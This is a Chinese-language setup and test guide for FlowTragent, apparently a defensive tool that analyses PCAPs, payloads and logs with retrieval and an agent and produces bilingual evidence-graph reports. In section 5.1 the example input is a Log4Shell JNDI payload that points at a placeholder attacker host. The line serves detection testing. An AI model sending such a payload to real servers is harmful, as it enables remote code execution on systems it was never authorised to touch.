# FlowTragent WSL Ubuntu 启动与测试指南

本文档面向 Windows 11 + WSL2 Ubuntu 环境，目标是跑通：

```text
PCAP / payload / 日志 -> 结构化事件 -> NOVA-F 检索 -> Agent 研判 -> 证据图谱 -> 中英文报告
```

## 1. 进入项目

```bash
cd /mnt/e/ctfcodes/FlowTragent
```

如果是新机器克隆：

```bash
mkdir -p ~/projects
cd ~/projects
git clone --recurse-submodules https://github.com/sishijiuhack/FlowTragent.git
cd FlowTragent
git submodule update --init --recursive
```

## 2. 激活 Python 环境

推荐 Python 3.11。当前验证过的 conda 环境为：

```bash
source ~/miniconda3/etc/profile.d/conda.sh
conda activate flowtragent_py311
python --version
```

不要使用 Python 3.13 安装当前依赖组合，`numpy`、`torch` 等包可能缺少稳定 wheel，容易触发源码编译或 I/O 错误。

## 3. 安装与检查依赖

```bash
mkdir -p ~/pip-tmp ~/pip-cache
TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
python -m pip check
```

如果安装 `torch` 途中出现 I/O 错误，先清理临时目录后重试：

```bash
rm -rf ~/pip-tmp ~/pip-cache
mkdir -p ~/pip-tmp ~/pip-cache
TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
```

## 4. 构建或使用 NOVA-F 索引

FlowTragent 默认优先读取：

```text
data/index/faiss.index
data/index/meta.json
```

如果使用本地 DataCon 数据集构建索引：

```bash
python scripts/convert_datacon_dataset.py \
  --input libs/nova-f/data/datacon2025-xlab-httpcve/data-release/train.json.gz \
  --output data/csv/datacon_train_labeled.csv

python scripts/build_demo_index.py \
  --input data/csv/datacon_train_labeled.csv \
  --output-dir data/index \
  --model libs/nova-f/models/all-MiniLM-L6-v2
```

离线或模型不可用时，可使用 hash embedding 跑通功能验证：

```bash
FLOWTRAGENT_OFFLINE=1 python scripts/build_demo_index.py \
  --input data/csv/datacon_train_labeled.csv \
  --output-dir data/index
```

## 5. 命令行分析

### 5.1 Payload 模式

```bash
python main.py \
  --mode payload \
  --input 'GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim' \
  --demo-index \
  --enable-rag
```

### 5.2 PCAP 模式

```bash
python tests/make_demo_pcap.py
python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
```

### 5.3 后利用与 C2 Demo

```bash
python tests/make_post_exploit_pcap.py
python main.py --mode pcap --input data/pcap/demo_post_exploit.pcap --enable-rag

python tests/make_http_beacon_pcap.py
python main.py --mode pcap --input data/pcap/demo_http_beacon.pcap --enable-rag
```

### 5.4 Live 抓包模式

```bash
sudo apt update
sudo apt install -y tcpdump
sudo $(which python) main.py --mode live --interface eth0 --capture-seconds 30 --enable-rag
```

也可以先手动抓包再分析：

```bash
sudo tcpdump -i eth0 -w /tmp/test.pcap
python main.py --mode pcap --input /tmp/test.pcap --output-dir ./reports --enable-rag
```

## 6. 报告输出

每次分析会在 `reports/` 下生成三类文件：

```text
flowtragent_report_<时间戳>.md       # 英文 Markdown 报告
flowtragent_report_<时间戳>_zh.md    # 中文 Markdown 报告
flowtragent_report_<时间戳>.json     # 结构化 JSON
```

JSON 中的证据图谱同时包含中英文图文本：

```json
{
  "evidence_graph": {
    "mermaid": "English Mermaid graph",
    "mermaid_zh": "中文 Mermaid 图谱",
    "dot": "English Graphviz DOT",
    "dot_zh": "中文 Graphviz DOT"
  }
}
```

查看最新报告：

```bash
ls -lt reports/*.md | head
tail -n +1 "$(ls -t reports/*_zh.md | head -1)"
```

## 7. Web 界面

启动 Flask Web UI：

```bash
python web_app.py
```

浏览器打开：

```text
http://127.0.0.1:5000
```

Web UI 支持：

- 直接输入 payload 分析。
- 上传 PCAP、Access Log、DNS Log、Endpoint Log。
- 勾选 demo index、RAG、Ollama。
- 在报告详情页使用“中文 / English”切换报告语言。
- 证据图谱的 Mermaid 和 Graphviz DOT 文本会跟随语言切换。
- `/graph-svg/<report.json>?lang=zh|en` 会按语言渲染 SVG 图。

如果 Windows 浏览器无法访问 WSL 服务，可临时把 `web_app.py` 末尾监听地址从 `127.0.0.1` 改为 `0.0.0.0` 后重启。

## 8. 准实时服务器模式

该模式用于在 WSL Ubuntu 中模拟服务器部署。核心流程是：

```text
tcpdump 分片抓包 -> 轻量预筛 -> 可疑窗口深度分析 -> SQLite 告警 -> Web /alerts 查看
```

终端 1：启动 Web：

```bash
python web_app.py
```

终端 2：启动抓包 worker：

```bash
python scripts/live_capture_worker.py \
  --interface eth0 \
  --segment-seconds 60 \
  --profile balanced
```

如果只是检查 tcpdump 命令，不实际抓包：

```bash
python scripts/live_capture_worker.py \
  --interface eth0 \
  --segment-seconds 60 \
  --profile balanced \
  --dry-run
```

终端 3：启动分析 worker：

```bash
python scripts/live_analyzer_worker.py \
  --watch-dir data/live/incoming \
  --db data/live/alerts.db \
  --enable-rag
```

测试时也可以只处理当前目录已有 PCAP 后退出：

```bash
python scripts/live_analyzer_worker.py \
  --watch-dir data/live/incoming \
  --db data/live/alerts.db \
  --once
```

Web 查看告警：

```text
http://127.0.0.1:5000/alerts
```

实时模式默认不会对所有流量跑 NOVA-F、Agent 或 Ollama。它会先用 `src/live/prefilter.py` 做轻量预筛，只有风险分达到阈值或命中高危特征的 PCAP 分片才进入完整分析。

常用抓包 profile：

```text
http_dns  仅覆盖 HTTP/HTTPS 常见端口和 DNS，资源占用最低
balanced  覆盖 HTTP/DNS、常见服务端口和 1-1024 TCP 端口，推荐默认
wide      覆盖 tcp or udp，适合短时间排查
```

预筛和分析状态保存在：

```text
data/live/alerts.db
```

## 9. Ollama 可选验证

安装并拉取轻量模型：

```bash
curl -fsSL https://ollama.com/install.sh | sh
ollama pull phi3:mini
```

启动服务：

```bash
OLLAMA_HOST=0.0.0.0:11434 ollama serve
```

测试：

```bash
python scripts/ollama_smoke_test.py --host http://127.0.0.1:11434 --model phi3:mini
```

如果 Ollama 不可用，FlowTragent 仍会生成确定性 Agent 报告，只是 LLM 结构化摘要会标记为不可用或降级。

## 10. 推荐测试集

```bash
python -m py_compile src/correlation/evidence_graph.py src/report/generator.py web_app.py
python tests/test_live_prefilter.py
python tests/test_alert_store.py
python tests/test_live_analyzer_worker.py
python tests/test_nova.py
python tests/test_pipeline.py
python tests/test_multisource_pipeline.py
python tests/test_web_app.py
python tests/test_agent_orchestrator.py
python tests/test_langgraph_runner.py
python tests/test_dns_tcp_c2_pipeline.py
python tests/test_post_exploit_and_c2_pipeline.py
python tests/test_llm_summary.py
python -m pip check
```

## 11. 常见问题

### 10.1 Chroma telemetry 报错

看到类似信息通常不影响报告生成：

```text
Failed to send telemetry event ...
```

这是 ChromaDB telemetry 兼容性问题，可忽略。

### 10.2 Graphviz SVG 不显示

安装 Graphviz：

```bash
sudo apt update
sudo apt install -y graphviz
```

没有 Graphviz 时，Web UI 会回退展示 DOT 文本。

### 10.3 PCAP 抓包权限不足

```bash
sudo tcpdump -i eth0 -w /tmp/test.pcap
sudo $(which python) main.py --mode live --interface eth0 --capture-seconds 30 --enable-rag
```

### 10.4 不要提交本地大文件

以下内容通常不应提交到 GitHub：

```text
reports/
data/index/
data/csv/
data/tmp/
libs/nova-f/data/
libs/nova-f/models/
docs/FlowTragent_项目进度报告.md
```
